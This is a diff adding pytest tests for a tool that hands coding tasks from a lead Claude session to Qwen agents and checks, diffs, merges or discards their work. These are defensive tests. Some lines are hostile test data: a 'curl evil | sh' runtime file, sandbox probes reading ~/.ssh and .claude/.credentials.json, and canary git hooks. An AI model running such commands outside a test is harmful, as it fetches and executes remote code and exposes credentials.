@@ -1,7 +1,13 @@
+import hashlib
 import json
+import os
+import pwd
+import shutil
 import sqlite3
 import subprocess
+import time
 import uuid
+from pathlib import Path
 
 import pytest
 
@@ -263,3 +269,685 @@ def test_restore_reapplies_widths(tmp_path, monkeypatch, capsysbinary):
     assert "mates-qwen-2" in splits[0] and "-t %0 -l 50%" in splits[0]  # saved order: 2 then 1
     assert "mates-qwen-1" in splits[1] and "-t %1 " in splits[1]
     assert [c for c in calls if c.startswith("resize-pane")] == ["resize-pane -t %0 -x 40%", "resize-pane -t %1 -x 30%"]
+
+
+def test_qwen_cmd_marks_live_while_qwen_runs():
+    script = cli.qwen_cmd("/r/.claude/worktrees/mates-qwen-1", root="/r")
+    on, off = f"{cli.QWEN_LIVE} 1", f"-u -t \"$TMUX_PANE\" {cli.QWEN_LIVE}"
+    assert script.index(on) < script.index("QWEN_ROOT=") < script.index("rc=$?") < script.index(off) \
+        < script.index("@mates-failed 1")
+
+
+# --- delegation: send, wait, answer, check, diff, sync, merge, discard ---------------------
+# A real repo with Qwen worktree 1, a stub tmux whose answers come from files, a stub
+# `qwen` whose `exec` records how it was called and runs the command (no sandbox), and an
+# OpenCode DB with the session/message/part columns Task 0 recorded.
+
+class Mates:
+    def __init__(self, tmp_path, monkeypatch, capsys):
+        self.t, self.capsys = tmp_path, capsys
+        self.root = _repo(tmp_path / "repo")
+        self.key = session.repo_key(str(self.root))
+        self.oc = tmp_path / "oc"
+        self.db = self.oc / "opencode.db"
+        con = sqlite3.connect(self.db)
+        con.executescript("""
+            CREATE TABLE session (id text PRIMARY KEY, project_id text NOT NULL, parent_id text,
+                directory text NOT NULL, title text NOT NULL, time_created integer NOT NULL,
+                time_updated integer NOT NULL);
+            CREATE TABLE message (id text PRIMARY KEY, session_id text NOT NULL,
+                time_created integer NOT NULL, time_updated integer NOT NULL, data text NOT NULL);
+            CREATE TABLE part (id text PRIMARY KEY, message_id text NOT NULL, session_id text NOT NULL,
+                time_created integer NOT NULL, time_updated integer NOT NULL, data text NOT NULL);
+        """)
+        con.close()
+        tm = tmp_path / "tmux"
+        tm.write_text(f"""#!/bin/sh
+T='{tmp_path}'
+printf '%s\\n' "$*" >> "$T/tmux.log"
+case $1 in
+  list-panes) cat "$T/panes" 2>/dev/null ;;
+  display) cat "$T/live" 2>/dev/null ;;
+  capture-pane) cat "$T/capture" 2>/dev/null ;;
+  load-buffer) {{ cat; printf '\\n<<END>>\\n'; }} >> "$T/buffers" ;;
+  send-keys) [ -x "$T/on-enter" ] && "$T/on-enter" ;;
+esac
+exit 0
+""")
+        tm.chmod(0o755)
+        monkeypatch.setattr(layout, "TMUX", str(tm))
+        q = tmp_path / "qwen-stub"
+        q.write_text(f"""#!/bin/sh
+case $1 in
+  opencode-dir) echo '{self.oc}' ;;
+  exec) shift; [ "$1" = -- ] && shift
+        printf '%s|%s|%s|%s|%s\\n' "$PWD" "$QWEN_ROOT" "$QWEN_GIT_RO" "${{QWEN_RUNTIME:-}}" "$*" >> '{tmp_path}/exec.log'
+        exec "$@" ;;
+esac
+""")
+        q.chmod(0o755)
+        monkeypatch.setenv("MATES_QWEN", str(q))
+        monkeypatch.setenv("MATES_LEAD", "1")
+        monkeypatch.setenv("MATES_ROOT", str(self.root))
+        monkeypatch.setattr(cli, "LOG", tmp_path / "log.jsonl")
+        monkeypatch.setattr(cli, "SESSION_WAIT_S", 0.3)
+        monkeypatch.setattr(cli, "SESSION_POLL_S", 0.05)
+        monkeypatch.setattr(cli, "WAIT_POLL_S", 0.05)
+        self.wt = session.ensure_worktree(self.root, 1)[0]
+        st = session.new_state(str(self.root))
+        st["qwens"] = [_q(str(self.root), 1)]
+        session.save(str(self.root), st)
+        self.pane("%1", 1)
+        self.live(True)
+        self.input("┃  Ask anything… \"Fix a TODO in the codebase\"\n")
+
+    # tmux answers
+    def pane(self, pid, n, failed=False):
+        with open(self.t / "panes", "a") as f:
+            f.write(f"{pid}\t{self.key}:{n}\t{'1' if failed else ''}\n")
+
+    def no_panes(self):
+        (self.t / "panes").write_text("")
+
+    def live(self, on):
+        (self.t / "live").write_text("1\n" if on else "\n")
+
+    def input(self, text):
+        (self.t / "capture").write_text("some reply\n" * 30 + text)
+
+    def tmux_calls(self):
+        p = self.t / "tmux.log"
+        return p.read_text().splitlines() if p.exists() else []
+
+    def buffers(self):
+        p = self.t / "buffers"
+        return p.read_text().split("\n<<END>>\n")[:-1] if p.exists() else []
+
+    # OpenCode DB
+    def ses(self, sid, updated_s=None, directory=None):
+        con = sqlite3.connect(self.db)
+        ms = int((updated_s or time.time()) * 1000)
+        con.execute("INSERT INTO session VALUES (?, 'p', NULL, ?, 't', ?, ?)",
+                    (sid, str(directory or self.wt), ms, ms))
+        con.commit()
+        con.close()
+
+    def msg(self, sid, role, created_s, completed_s=None, finish=None):
+        data = {"role": role, "time": {"created": int(created_s * 1000)}}
+        if completed_s is not None:
+            data["time"]["completed"] = int(completed_s * 1000)
+        if finish:
+            data["finish"] = finish
+        up = int((completed_s or created_s) * 1000)
+        con = sqlite3.connect(self.db)
+        con.execute("INSERT INTO message VALUES (?, ?, ?, ?, ?)",
+                    (uuid.uuid4().hex, sid, int(created_s * 1000), up, json.dumps(data)))
+        con.commit()
+        con.close()
+
+    def on_enter_creates_session(self, sid):
+        """OpenCode stand-in: the session row appears when the [from Claude] message is entered."""
+        p = self.t / "on-enter"
+        p.write_text(f"""#!/usr/bin/env python3
+import sqlite3, time
+if "[from Claude]" in open('{self.t}/buffers').read():
+    con = sqlite3.connect('{self.db}')
+    ms = int(time.time() * 1000) + 5000
+    con.execute("INSERT OR IGNORE INTO session VALUES ('{sid}', 'p', NULL, '{self.wt}', 't', ?, ?)", (ms, ms))
+    con.commit()
+""")
+        p.chmod(0o755)
+
+    # running commands
+    def run(self, *argv):
+        self.capsys.readouterr()
+        try:
+            code = cli.main([str(a) for a in argv])
+        except SystemExit as e:
+            code = e.code
+        out = self.capsys.readouterr()
+        return code, out.out, out.err
+
+    def state(self):
+        return session.load(str(self.root))
+
+    def task(self, n=1):
+        return next(q for q in self.state()["qwens"] if q["n"] == n)["task"]
+
+    def git(self, *args, cwd=None):
+        return _git(cwd or self.root, *args)
+
+    def lead_commit(self, name, text):
+        (self.root / name).write_text(text)
+        self.git("add", name)
+        self.git("commit", "-q", "-m", f"lead {name}")
+        return self.git("rev-parse", "HEAD")
+
+    def send(self, text="fix a.txt", *extra):
+        code, out, err = self.run("send", 1, "--reason", "clear check", "--files", "a.txt", *extra, text)
+        assert code == 0, err
+        return out, err
+
+    def log(self):
+        p = self.t / "log.jsonl"
+        return [json.loads(line) for line in p.read_text().splitlines()] if p.exists() else []
+
+
+@pytest.fixture
+def m(tmp_path, monkeypatch, capsys):
+    return Mates(tmp_path, monkeypatch, capsys)
+
+
+def test_send_pastes_prefixed_message(m):
+    m.send("fix add() in a.txt", "--continue")
+    calls = [c for c in m.tmux_calls() if c.split()[0] in ("load-buffer", "paste-buffer", "send-keys")]
+    assert calls == ["load-buffer -b mates-1 -", "paste-buffer -p -d -b mates-1 -t %1", "send-keys -t %1 Enter"]
+    assert m.buffers() == ["[from Claude] fix add() in a.txt\n" + cli.ASK_SUFFIX]
+    t = m.task()
+    assert (t["summary"], t["reason"], t["files"], t["attempts"]) == ("fix add() in a.txt", "clear check", ["a.txt"], 1)
+    assert t["base"] == m.git("rev-parse", "HEAD") and not t["direct"]
+
+
+def test_send_refuses_dirty_worktree(m):
+    (m.wt / "a.txt").write_text("qwen's unmerged work\n")
+    (m.wt / "new.py").write_text("x = 1\n")
+    code, _, err = m.run("send", 1, "--reason", "r", "next task")
+    assert code != 0 and "merge 1" in err and "discard 1" in err and "a.txt" in err
+    assert (m.wt / "a.txt").read_text() == "qwen's unmerged work\n" and (m.wt / "new.py").exists()
+    assert m.buffers() == [] and m.task() is None
+
+
+def test_send_refuses_busy(m):
+    m.ses("ses_1")
+    m.msg("ses_1", "user", time.time())  # a message with no reply yet
+    code, _, err = m.run("send", 1, "--reason", "r", "task")
+    assert code != 0 and "busy" in err and m.buffers() == []
+
+
+def test_send_refuses_second_open_task(m):
+    session.ensure_worktree(m.root, 2)
+    st = m.state()
+    st["qwens"].append(_q(str(m.root), 2, task={"id": "other", "direct": False}))
+    session.save(str(m.root), st)
+    m.pane("%2", 2)
+    code, _, err = m.run("send", 1, "--reason", "r", "task")
+    assert code != 0 and "pane 2" in err and "parallel" in err and m.buffers() == []
+
+
+def test_send_refuses_shell_pane(m):
+    m.live(False)  # qwen is not running in the pane (the wrapper's shell, or OpenCode quit)
+    code, _, err = m.run("send", 1, "--reason", "r", "task")
+    assert code != 0 and cli.QWEN_LIVE in err and m.buffers() == []
+
+
+def test_send_refuses_nonempty_input(m):
+    m.input("┃  half a sentence Wai is typ\n")
+    code, _, err = m.run("send", 1, "--reason", "r", "task")
+    assert code != 0 and "input box" in err and m.buffers() == []
+
+
+def test_send_refuses_missing_pane(m):
+    m.no_panes()
+    code, _, err = m.run("send", 1, "--reason", "r", "task")
+    assert code != 0 and "gone" in err
+    assert m.state()["qwens"][0]["closed"] is True and m.buffers() == []
+
+
+def test_send_refuses_failed_pane(m):
+    m.no_panes()
+    m.pane("%1", 1, failed=True)
+    code, _, err = m.run("send", 1, "--reason", "r", "task")
+    assert code != 0 and "failed" in err and m.buffers() == []
+    assert m.state()["qwens"][0]["closed"] is False
+
+
+def test_send_rebases_clean_worktree(m):
+    head = m.lead_commit("b.txt", "lead moved on\n")
+    m.send()
+    assert m.git("rev-parse", "HEAD", cwd=m.wt) == head
+    assert m.git("rev-parse", "refs/heads/mates/qwen-1") == head
+    assert (m.wt / "b.txt").read_text() == "lead moved on\n"
+    assert m.task()["base"] == head
+    assert cli.worktree_dirty(str(m.root), 1) == []
+
+
+def test_send_starts_new_session(m):
+    m.ses("ses_old", updated_s=time.time() - 100)
+    m.on_enter_creates_session("ses_new")
+    m.send()
+    bufs = m.buffers()
+    assert bufs[0] == "/new" and bufs[1].startswith("[from Claude] ")
+    assert m.task()["opencode_session"] == "ses_new"
+    assert m.state()["qwens"][0]["opencode_session"] == "ses_new"
+
+
+def test_send_continue_keeps_session(m):
+    m.ses("ses_old", updated_s=time.time() - 100)
+    m.on_enter_creates_session("ses_new")
+    m.send("more on that", "--continue")
+    assert [b for b in m.buffers() if b == "/new"] == []
+    assert m.task()["opencode_session"] == "ses_old"
+
+
+def test_wait_finds_late_session_row(m):
+    m.send()
+    assert m.task()["opencode_session"] is None  # no row yet
+    code, out, _ = m.run("wait", 1, "--timeout", "0.2")
+    assert (code, out) == (1, "timeout\n")  # busy while the session is unknown
+    now = time.time() + 1
+    m.ses("ses_late", updated_s=now)
+    m.msg("ses_late", "user", now)
+    m.msg("ses_late", "assistant", now + 1, completed_s=now + 2, finish="stop")
+    code, out, _ = m.run("wait", 1, "--timeout", "1")
+    assert out == "idle\n"
+    assert m.task()["opencode_session"] == "ses_late"
+
+
+def test_send_reminds_after_two_attempts(m):
+    _, err = m.send()
+    assert "attempt" not in err
+    _, err = m.send("fix a.txt, and this time keep the test")  # nothing changed: the same task, again
+    assert "attempt 2" in err and "discard 1" in err
+    assert m.task()["attempts"] == 2
+    assert [r["outcome"] for r in m.log()] == ["sent-back"]
+
+
+def test_wait_done(m):
+    m.send()
+    (m.wt / ".mates").mkdir(exist_ok=True)
+    (m.wt / ".mates" / "done.md").write_text("a.txt: fixed\ntest status: passed\n" + "x" * 3000)
+    code, out, _ = m.run("wait", 1, "--timeout", "1")
+    assert code == 0 and out.startswith("done: a.txt: fixed\ntest status: passed\n")
+    assert len(out) == len("done: ") + cli.TEXT_MAX + 1
+
+
+def test_wait_question(m):
+    m.send()
+    (m.wt / ".mates").mkdir(exist_ok=True)
+    (m.wt / ".mates" / "question.md").write_text("Which function?\n")
+    assert m.run("wait", 1, "--timeout", "1")[1] == "question: Which function?\n"
+
+
+def test_wait_refuses_linked_protocol_file(m):
+    m.send()
+    secret = m.t / "secret"
+    secret.write_text("PRIVATE\n")
+    (m.wt / ".mates").mkdir(exist_ok=True)
+    (m.wt / ".mates" / "done.md").symlink_to(secret)
+    code, out, err = m.run("wait", 1, "--timeout", "1")
+    assert code != 0 and "PRIVATE" not in out + err
+
+
+def test_wait_dead_pane(m):
+    m.send()
+    m.no_panes()
+    assert m.run("wait", 1, "--timeout", "1")[1] == "dead\n"
+    assert m.state()["qwens"][0]["closed"] is True
+
+
+def test_wait_failed_pane(m):
+    m.send()
+    m.no_panes()
+    m.pane("%1", 1, failed=True)
+    assert m.run("wait", 1, "--timeout", "1")[1] == "failed\n"
+
+
+def test_wait_idle(m):
+    m.on_enter_creates_session("ses_1")
+    m.send()
+    t = m.task()["paste_ts"]
+    m.msg("ses_1", "user", t + 0.5)
+    m.msg("ses_1", "assistant", t + 1, completed_s=t + 2, finish="stop")
+    assert m.run("wait", 1, "--timeout", "1")[1] == "idle\n"
+
+
+def test_wait_not_idle_right_after_send(m):
+    m.ses("ses_1", updated_s=time.time() - 50)
+    m.msg("ses_1", "assistant", time.time() - 60, completed_s=time.time() - 50, finish="stop")  # the last reply
+    m.send("next", "--continue")
+    assert m.run("wait", 1, "--timeout", "0.2")[1] == "timeout\n"
+
+
+def test_wait_timeout(m):
+    m.on_enter_creates_session("ses_1")
+    m.send()
+    m.msg("ses_1", "user", time.time())
+    t0 = time.time()
+    code, out, _ = m.run("wait", 1, "--timeout", "0.3")
+    assert (code, out) == (1, "timeout\n") and time.time() - t0 < 2
+
+
+def test_answer_clears_stale_done(m):
+    m.send()
+    (m.wt / ".mates").mkdir(exist_ok=True)
+    (m.wt / ".mates" / "question.md").write_text("Which function?\n")
+    (m.wt / ".mates" / "done.md").write_text("stale\n")
+    code, out, err = m.run("answer", 1, "add(), in a.txt")
+    assert code == 0, err
+    assert not (m.wt / ".mates" / "question.md").exists() and not (m.wt / ".mates" / "done.md").exists()
+    assert m.buffers()[-1] == "[from Claude] add(), in a.txt\n" + cli.ASK_SUFFIX
+    t = m.task()
+    assert t["questions"] == [{"q": "Which function?", "a": "add(), in a.txt"}] and t["attempts"] == 1
+    assert m.log() == []
+
+
+def test_answer_sendback_counts_attempt(m):
+    m.send()
+    (m.wt / "a.txt").write_text("wrong\n")
+    assert m.run("check", 1, "--", "true")[0] == 0
+    assert m.run("diff", 1)[0] == 0
+    assert m.task()["checked_tree"] and m.task()["diffed_tree"]
+    code, _, err = m.run("answer", 1, "--sendback", "the result must be b")
+    assert code == 0, err
+    t = m.task()
+    assert t["attempts"] == 2 and t["checked_tree"] is None and t["diffed_tree"] is None
+    assert t["attempt_ts"] >= t["sent_ts"]
+    (rec,) = m.log()
+    assert (rec["outcome"], rec["attempts"], rec["pane"], rec["route"]) == ("sent-back", 1, 1, "qwen")
+    assert "discard 1" in err
+
+
+def test_diff_includes_untracked(m):
+    m.send()
+    (m.wt / "a.txt").write_text("b\n")
+    (m.wt / "brand_new.py").write_text("y = 2\n")
+    (m.wt / ".mates").mkdir(exist_ok=True)
+    (m.wt / ".mates" / "done.md").write_text("done\n")
+    code, out, _ = m.run("diff", 1)
+    assert code == 0
+    assert "+++ b/brand_new.py" in out and "+y = 2" in out and "+++ b/a.txt" in out
+    assert "done.md" not in out
+    assert "unnamed-file:brand_new.py" in out and "unnamed-file:a.txt" not in out
+    t = m.task()
+    assert t["diffed_tree"] == cli.snapshot(str(m.root), 1, t["base"])
+    assert t["flags"] == ["unnamed-file:brand_new.py"]
+
+
+def test_check_records_tree_and_runs_sandboxed(m):
+    m.send()
+    (m.wt / "a.txt").write_text("b\n")
+    code, out, _ = m.run("check", 1, "--", "cat a.txt; echo ok")
+    assert code == 0 and out.splitlines()[0].startswith("check exit 0") and out.splitlines()[-2:] == ["b", "ok"]
+    t = m.task()
+    tree = cli.snapshot(str(m.root), 1, t["base"])
+    assert (t["checked_tree"], t["check_cmd"]) == (tree, "cat a.txt; echo ok")
+    (line,) = (m.t / "exec.log").read_text().splitlines()
+    cwd, qroot, ro, rt, argv = line.split("|")
+    assert cwd == str(m.wt / ".mates" / "check" / tree)
+    assert (qroot, ro, rt, argv) == (str(m.wt), "1", "", "sh -c cat a.txt; echo ok")
+
+
+def test_check_failure_records_nothing(m):
+    m.send()
+    code, out, _ = m.run("check", 1, "--", "echo nope; exit 3")
+    assert code == 3 and "check exit 3" in out and "nope" in out
+    assert m.task()["checked_tree"] is None
+
+
+def test_check_refuses_busy(m):
+    m.ses("ses_1")
+    m.msg("ses_1", "user", time.time())
+    code, _, err = m.run("check", 1, "--", "true")
+    assert code != 0 and "busy" in err and not (m.t / "exec.log").exists()
+
+
+def test_check_ignores_export_ignore(m):
+    m.send()
+    (m.wt / "b.txt").write_text("needed by the check\n")
+    (m.wt / ".gitattributes").write_text("b.txt export-ignore\n")
+    assert m.run("check", 1, "--", "test -f b.txt")[0] == 0
+
+
+def test_check_runs_on_snapshot(m):
+    m.send()
+    (m.wt / "a.txt").write_text("b\n")
+    old = m.wt / ".mates" / "check" / ("0" * 40)
+    old.mkdir(parents=True)  # an older check folder goes
+    assert m.run("check", 1, "--", "echo made > made.txt; mkdir -p d && echo x > d/f")[0] == 0
+    tree = m.task()["checked_tree"]
+    assert (m.wt / ".mates" / "check" / tree / "made.txt").exists()
+    assert not old.exists()
+    assert not (m.wt / "made.txt").exists() and not (m.wt / "d").exists()
+    assert cli.worktree_dirty(str(m.root), 1) == ["a.txt"]
+    assert cli.snapshot(str(m.root), 1, m.task()["base"]) == tree
+
+
+def test_check_refuses_linked_check_folder(m):
+    m.send()
+    target = m.t / "elsewhere"
+    target.mkdir()
+    (target / "keep").write_text("keep\n")
+    (m.wt / ".mates").mkdir(exist_ok=True)
+    (m.wt / ".mates" / "check").symlink_to(target)
+    code, _, err = m.run("check", 1, "--", "true")
+    assert code != 0 and "refusing" in err
+    assert sorted(p.name for p in target.iterdir()) == ["keep"]
+
+
+@pytest.mark.skipif(shutil.which("bwrap") is None, reason="bwrap not installed")
+def test_check_cannot_reach_home(m, monkeypatch):
+    real_home = Path(pwd.getpwuid(os.getuid()).pw_dir)
+    monkeypatch.setenv("MATES_QWEN", str(Path(cli.__file__).resolve().parent.parent / "bin" / "qwen"))
+    monkeypatch.setenv("XDG_STATE_HOME", str(m.t / "state"))
+    monkeypatch.setenv("XDG_CONFIG_HOME", str(m.t / "config"))
+    monkeypatch.setenv("QWEN_OPENCODE", "/bin/false")  # bin/qwen exits at start without one; exec never runs it
+    m.send()
+    outside = m.t / "outside"
+    outside.mkdir()
+    home = Path(os.environ["HOME"])
+    home.mkdir(parents=True, exist_ok=True)
+    for cmd in (f'echo x > "$HOME/canary" && echo x > {home}/canary', f"echo x > {outside}/canary",
+                f"ls {real_home}/.ssh", f"cat {real_home}/.claude/.credentials.json"):
+        code, out, _ = m.run("check", 1, "--", cmd)
+        assert code != 0, (cmd, out)
+    assert not (home / "canary").exists() and not (outside / "canary").exists()
+    assert m.task()["checked_tree"] is None
+    code, out, _ = m.run("check", 1, "--", "cat a.txt")  # the sandbox itself works
+    assert code == 0 and out.splitlines()[-1] == "a"
+
+
+def _checked_and_diffed(m, edit="b\n"):
+    (m.wt / "a.txt").write_text(edit)
+    assert m.run("check", 1, "--", "true")[0] == 0
+    assert m.run("diff", 1)[0] == 0
+
+
+def test_merge_fast_forwards_and_resets(m):
+    base = m.git("rev-parse", "HEAD")
+    m.send("make a.txt say b")
+    (m.wt / "untracked_new.py").write_text("z = 3\n")
+    _checked_and_diffed(m)
+    code, out, err = m.run("merge", 1)
+    assert code == 0, err
+    head = m.git("rev-parse", "HEAD")
+    assert m.git("rev-parse", "HEAD^") == base
+    assert m.git("log", "-1", "--format=%s") == "mates qwen-1: make a.txt say b"
+    assert (m.root / "a.txt").read_text() == "b\n" and (m.root / "untracked_new.py").exists()
+    assert m.git("status", "--porcelain") == ""
+    assert m.git("rev-parse", "refs/heads/mates/qwen-1") == head == m.git("rev-parse", "HEAD", cwd=m.wt)
+    assert cli.worktree_dirty(str(m.root), 1) == []
+    assert m.git("status", "--porcelain", cwd=m.wt) == ""  # the worktree's own index matches too
+    assert m.task() is None
+
+
+def test_merge_refuses_without_check(m):
+    m.send()
+    (m.wt / "a.txt").write_text("b\n")
+    assert m.run("diff", 1)[0] == 0
+    code, _, err = m.run("merge", 1)
+    assert code != 0 and "mates check 1" in err
+
+
+def test_merge_refuses_without_diff(m):
+    m.send()
+    (m.wt / "a.txt").write_text("b\n")
+    assert m.run("check", 1, "--", "true")[0] == 0
+    code, _, err = m.run("merge", 1)
+    assert code != 0 and "mates diff 1" in err
+    assert (m.root / "a.txt").read_text() == "a\n"
+
+
+def test_merge_logs_accepted(m):
+    m.send()
+    _checked_and_diffed(m)
+    tree = m.task()["checked_tree"]
+    assert m.run("merge", 1)[0] == 0
+    (rec,) = m.log()
+    assert (rec["outcome"], rec["route"], rec["pane"], rec["attempts"], rec["summary"]) == \
+        ("accepted", "qwen", 1, 1, "fix a.txt")
+    assert rec["tree"] == tree and rec["full_diff_read"] is True and rec["check"] == "true"
+    assert rec["check_sha"] == hashlib.sha256(b"true").hexdigest()
+    assert rec["reason"] == "clear check" and rec["questions"] == [] and rec["flags"] == []
+
+
+def test_merge_commits_checked_snapshot(m):
+    m.send()
+    _checked_and_diffed(m)
+    checked = m.task()["checked_tree"]
+    (m.wt / "a.txt").write_text("edited after the check\n")
+    code, _, err = m.run("merge", 1)
+    assert code == 0
+    assert m.git("rev-parse", "HEAD^{tree}") == checked
+    assert (m.root / "a.txt").read_text() == "b\n"
+    refs = m.git("for-each-ref", "--format=%(refname)", "refs/mates/discarded/").splitlines()
+    assert len(refs) == 1 and refs[0].startswith("refs/mates/discarded/1-") and refs[0] in err
+    assert m.git("show", f"{refs[0]}:a.txt") == "edited after the check"
+    assert (m.wt / "a.txt").read_text() == "b\n"
+
+
+def test_merge_refuses_when_lead_moved(m):
+    m.send()
+    _checked_and_diffed(m)
+    m.lead_commit("b.txt", "lead\n")
+    code, _, err = m.run("merge", 1)
+    assert code != 0 and "lead moved: run mates sync 1, then check again" in err
+
+
+def test_sync_carries_work_and_clears_check(m):
+    m.send()
+    (m.wt / "new.py").write_text("n = 1\n")
+    _checked_and_diffed(m)
+    lead = m.lead_commit("b.txt", "lead\n")
+    code, out, err = m.run("sync", 1)
+    assert code == 0, err
+    t = m.task()
+    assert t["base"] == lead and t["checked_tree"] is None and t["diffed_tree"] is None
+    assert m.git("rev-parse", "HEAD", cwd=m.wt) == lead
+    assert (m.wt / "b.txt").read_text() == "lead\n" and (m.wt / "a.txt").read_text() == "b\n"
+    assert (m.wt / "new.py").exists()
+    assert sorted(cli.worktree_dirty(str(m.root), 1)) == ["a.txt", "new.py"]
+    assert m.run("merge", 1)[0] != 0  # the check must run again
+    _checked_and_diffed(m)
+    assert m.run("merge", 1)[0] == 0
+    assert m.git("rev-parse", "HEAD^") == lead and (m.root / "new.py").exists()
+
+
+def test_sync_conflict_changes_nothing(m):
+    m.send()
+    _checked_and_diffed(m, "qwen's line\n")
+    before = m.task()
+    lead = m.lead_commit("a.txt", "lead's line\n")
+    code, out, _ = m.run("sync", 1)
+    assert code == 1 and out.splitlines() == ["conflict", "a.txt"]
+    assert m.task() == before
+    assert (m.wt / "a.txt").read_text() == "qwen's line\n"
+    assert m.git("rev-parse", "HEAD", cwd=m.wt) != lead
+
+
+def test_merge_refuses_dirty_lead_paths(m):
+    m.send()
+    _checked_and_diffed(m)
+    (m.root / "a.txt").write_text("the lead's own uncommitted edit\n")
+    code, _, err = m.run("merge", 1)
+    assert code != 0 and "uncommitted" in err and "a.txt" in err
+    assert (m.root / "a.txt").read_text() == "the lead's own uncommitted edit\n"
+    (m.root / "a.txt").write_text("a\n")
+    (m.root / "other.txt").write_text("unrelated\n")  # dirt elsewhere does not block
+    assert m.run("merge", 1)[0] == 0
+
+
+def test_merge_refuses_detached_lead(m):
+    m.send()
+    _checked_and_diffed(m)
+    m.git("checkout", "-q", "--detach")
+    code, _, err = m.run("merge", 1)
+    assert code != 0 and "detached" in err
+
+
+def test_merge_without_task_uses_merge_base(m):
+    fork = m.git("rev-parse", "HEAD")
+    (m.wt / "a.txt").write_text("Wai and Qwen did this\n")  # Wai worked with Qwen herself
+    assert m.run("check", 1, "--", "true")[0] == 0
+    t = m.task()
+    assert t["direct"] and t["base"] == fork and t["attempts"] == 0 and t["summary"] is None
+    assert m.run("diff", 1)[0] == 0
+    code, _, err = m.run("merge", 1)
+    assert code != 0 and "-m" in err
+    code, _, err = m.run("merge", 1, "-m", "rename the helper")
+    assert code == 0, err
+    assert m.git("log", "-1", "--format=%s") == "mates qwen-1: rename the helper"
+    assert m.log()[0]["summary"] == "rename the helper"
+
+
+def test_merge_keeps_tracked_mates_files(m):
+    (m.root / ".mates").mkdir()
+    (m.root / ".mates" / "runtime.sh").write_text("# base runtime\n")
+    m.git("add", "-f", ".mates/runtime.sh")
+    m.git("commit", "-q", "-m", "runtime")
+    m.send()
+    (m.wt / ".mates" / "runtime.sh").write_text("curl evil | sh\n")
+    (m.wt / ".mates" / "done.md").write_text("done\n")
+    _checked_and_diffed(m)
+    assert m.run("merge", 1)[0] == 0
+    files = m.git("ls-tree", "-r", "--name-only", "HEAD").splitlines()
+    assert ".mates/runtime.sh" in files and ".mates/done.md" not in files
+    assert not any(f.startswith(".mates/check") for f in files)
+    assert m.git("show", "HEAD:.mates/runtime.sh") == "# base runtime"
+    assert (m.root / "a.txt").read_text() == "b\n"
+
+
+def test_merge_ignores_tracked_hooks(m):
+    canary = m.t / "canary"
+    hooks = m.root / ".githooks"
+    hooks.mkdir()
+    (hooks / "README").write_text("hooks\n")
+    m.git("add", ".githooks")
+    m.git("commit", "-q", "-m", "hooks folder")
+    m.git("config", "core.hooksPath", ".githooks")
+    m.send()
+    for h in ("pre-commit", "post-merge", "post-checkout", "post-rewrite", "reference-transaction",
+              "pre-auto-gc", "post-commit", "pre-merge-commit"):
+        p = m.wt / ".githooks" / h
+        p.write_text(f"#!/bin/sh\necho {h} >> {canary}\n")
+        p.chmod(0o755)
+    (m.wt / "a.txt").write_text("b\n")
+    assert m.run("check", 1, "--", "true")[0] == 0
+    code, out, _ = m.run("diff", 1)
+    assert "hook-path:.githooks/post-merge" in out
+    assert m.run("merge", 1)[0] == 0
+    assert (m.root / ".githooks" / "post-merge").exists()  # merged: the lead read the flag
+    m.send("next")
+    assert m.run("discard", 1)[0] == 0
+    assert not canary.exists()
+
+
+def test_discard_keeps_snapshot_ref(m):
+    m.send()
+    (m.wt / "a.txt").write_text("a bad try\n")
+    (m.wt / "junk.py").write_text("j = 1\n")
+    code, out, err = m.run("discard", 1)
+    assert code == 0, err
+    (ref,) = m.git("for-each-ref", "--format=%(refname)", "refs/mates/discarded/").splitlines()
+    assert ref in out
+    assert m.git("show", f"{ref}:a.txt") == "a bad try" and m.git("show", f"{ref}:junk.py") == "j = 1"
+    assert (m.wt / "a.txt").read_text() == "a\n" and not (m.wt / "junk.py").exists()
+    assert cli.worktree_dirty(str(m.root), 1) == []
+    assert m.task() is None
+    assert [r["outcome"] for r in m.log()] == ["escalated"]
+
+
+def test_discard_failed_logs_failed(m):
+    m.send()
+    assert m.run("discard", 1, "--failed")[0] == 0
+    assert [r["outcome"] for r in m.log()] == ["failed"]
+    assert m.git("for-each-ref", "refs/mates/discarded/") == ""  # nothing to keep
